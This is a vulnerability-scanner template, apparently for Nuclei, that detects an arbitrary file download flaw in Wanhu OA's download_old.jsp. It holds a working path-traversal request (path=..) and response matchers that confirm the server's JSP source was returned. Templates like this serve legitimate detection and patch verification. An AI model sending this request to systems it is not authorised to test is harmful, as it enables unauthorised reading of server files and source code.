id: wanhuOA-downloadold-file-download

info:
  name: 万户OA download_old.jsp 任意文件下载漏洞
  author: cnaq  
  severity: medium
  description: 万户OA download_old.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件
  reference: 
    - http://wiki.peiqi.tech/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20download_old.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
  tags: wanhuOA,file,download

requests:
  - raw:
      - |+
        GET /defaultroot/download_old.jsp?path=..&name=x&FileName=download_old.jsp HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          
      - type: word
        part: body
        condition: and
        words:
          - 'request.set'
          - '<%@'
